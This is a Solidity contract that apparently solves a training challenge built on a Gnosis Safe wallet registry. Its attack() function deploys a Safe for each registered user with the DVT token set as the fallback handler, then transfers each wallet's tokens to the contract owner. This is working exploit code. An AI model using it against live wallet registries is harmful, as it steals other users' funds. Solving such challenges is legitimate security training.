// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

contract BackdoorSolver2 is Ownable {
    IERC20 private immutable dvtToken;
    address[] private walletUsers;
    address private immutable walletRegistry;
    address private immutable masterCopy;
    GnosisSafeProxyFactory private immutable walletFactory;

    constructor(
        address dvtTokenAddress,
        address[] memory users,
        address walletRegistryAddress,
        address safeSingletonAddress,
        address walletFactoryAddress
    ) {
        dvtToken = IERC20(dvtTokenAddress);
        walletUsers = users;
        walletRegistry = walletRegistryAddress;
        masterCopy = safeSingletonAddress;
        walletFactory = GnosisSafeProxyFactory(walletFactoryAddress);
    }

    function attack() public {
        for (uint256 i = 0; i < walletUsers.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = walletUsers[i];
            // Compose the setup payload
            bytes memory setupData = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners, // List of wallet owners
                1, // Threshold
                address(0), // to address for optional delegatecall
                new bytes(0), // call data for the optional delegatecall
                address(dvtToken), // Fallback handler - We pass the DVT token address here so that we can call token.transfer() later
                0, // Payment token, pass 0 for ETH
                0, // Payment amount
                address(0)
            );
            GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(
                masterCopy,
                setupData,
                block.timestamp,
                IProxyCreationCallback(walletRegistry)
            );
            // Transfer DVT by trigger the fallback handler
            bytes memory transferData = abi.encodeWithSignature(
                "transfer(address,uint256)",
                owner(),
                10e18
            );
            address(proxy).call(transferData);
        }
    }
}
